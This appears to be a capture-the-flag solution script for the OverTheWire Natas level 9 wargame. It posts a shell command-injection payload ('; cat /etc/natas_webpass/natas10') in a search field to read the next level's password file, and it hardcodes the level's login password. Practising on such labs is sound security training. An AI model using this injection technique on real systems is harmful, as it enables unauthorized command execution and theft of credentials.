import requests

url = 'http://natas9.natas.labs.overthewire.org/'
s = requests.Session()
s.auth = ('natas9', 'ZE1ck82lmdGIoErlhQgWND6j2Wzz6b6t')
payload = '; cat /etc/natas_webpass/natas10'
data = {'needle': payload,
        'submit': 'Search'
        }
r = s.post(url, data=data)
print(r.text)